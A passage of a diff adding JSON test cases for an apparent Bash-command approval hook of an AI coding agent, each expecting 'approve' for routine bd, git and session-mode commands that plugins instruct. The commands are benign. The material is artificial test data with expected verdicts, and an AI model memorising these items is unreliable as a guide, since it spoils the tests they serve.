+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_update_pg2_pk1_set_metadata_k_v_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd update pg2-pk1 --set-metadata k=v" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_update_pg2_pk1_unset_metadata_pd_stale_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd update pg2-pk1 --unset-metadata pd_stale" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_update_pg2_pk1_body_file_tmp_body_md_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd update pg2-pk1 --body-file /tmp/body.md" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_update_pg2_pk1_set_metadata_pd_curated_rev_r_set_meta_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd update pg2-pk1 --set-metadata pd_curated_rev=R --set-metadata pd_stale=R"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_update_help_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd update --help" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_comment_pg2_t1_file_tmp_report_md_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd comment pg2-t1 --file /tmp/report.md" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_comments_pg2_abc12_json_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd comments pg2-abc12 --json" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_list_parent_pg2_doc1_status_all_n_50_offset_50_json_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd list --parent pg2-doc1 --status all -n 50 --offset 50 --json"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_close_pg2_epic1_reason_outcome_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd close pg2-epic1 --reason \"outcome\"" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_update_pg2_doc1_set_metadata_pd_phase_released_partia_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd update pg2-doc1 --set-metadata pd_phase=released:partial"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_claude_marketplace_plan_decompose_scripts_create_packet_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "claude-marketplace/plan-decompose/scripts/create-packet.sh --parent pg2-epic1 --title \"title\" --body-file /tmp/body.md --acceptance \"criteria\" --metadata '{}' --actor sess-1"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_claude_marketplace_plan_decompose_scripts_chunk_for_bd_f_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "claude-marketplace/plan-decompose/scripts/chunk-for-bd-field.sh /tmp/in.md /tmp/out-prefix"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_claude_marketplace_plan_decompose_scripts_audit_docket_l_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "claude-marketplace/plan-decompose/scripts/audit-docket-label-leak.sh"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_git_diff_no_index_tmp_a_tmp_b_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git diff --no-index /tmp/a /tmp/b" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_git_ls_files_packages_foo_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git ls-files packages/foo" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_session_mode_show_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "session-mode show" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_session_mode_start_wrap_up_session_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "session-mode start wrap-up-session" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_session_mode_set_status_stopping_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "session-mode set-status stopping" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_session_mode_set_status_finished_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "session-mode set-status finished" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_session_mode_set_status_finished_handoff_bead_pg2_abc12_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "session-mode set-status finished --handoff-bead pg2-abc12"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_bd_close_pg2_a_pg2_b_reason_done_actor_sess_1_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd close pg2-a pg2-b --reason=\"done\" --actor sess-1"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_bd_create_title_t_description_why_type_task_p_2_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd create --title=\"t\" --description=\"why\" --type=task -p 2"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_bd_ready_claim_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd ready --claim" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_bd_list_status_in_progress_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd list --status in_progress" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_bd_list_status_in_progress_assignee_me_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd list --status in_progress --assignee me" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_bd_list_type_merge_request_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd list --type=merge-request" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_bd_update_pg2_abc12_add_label_auto_session_wrapped_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd update pg2-abc12 --add-label auto-session-wrapped"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_pg_hooks_status_porcelain_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-hooks status --porcelain" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_git_worktree_add_repo_worktrees_x_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git worktree add /repo/.worktrees/x" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_git_c_repo_rev_parse_abbrev_ref_head_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git -C /repo rev-parse --abbrev-ref HEAD" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_git_c_repo_status_porcelain_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git -C /repo status --porcelain" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_git_log_u_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git log @{u}.." }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_git_log_main_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git log main.." }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_git_status_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git status" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_git_rev_list_count_u_head_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git rev-list --count @{u}..HEAD" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_git_rev_list_count_origin_main_main_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git rev-list --count origin/main..main" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_git_merge_ff_only_origin_feature_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git merge --ff-only origin/feature" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_git_branch_d_feature_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git branch -d feature" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_session_wrapup_wtdone_feature_cc_repo_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "session-wrapup"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "wtdone feature --cc /repo" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the session-wrapup plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_integrate_branch_support_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "integrate-branch-support" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_integrate_branch_support_facts_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "integrate-branch-support --facts" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_config_get_pgii_integrate_branch_primarybranch_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git config --get pgii-integrate-branch.primaryBranch"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_rev_parse_abbrev_ref_head_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git rev-parse --abbrev-ref HEAD" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_rev_parse_git_common_dir_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git rev-parse --git-common-dir" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_rev_parse_path_format_absolute_git_common_dir_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git rev-parse --path-format=absolute --git-common-dir"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_c_repo_worktrees_wt_rev_parse_git_path_rebase_merge_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git -C /repo/.worktrees/wt rev-parse --git-path rebase-merge"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
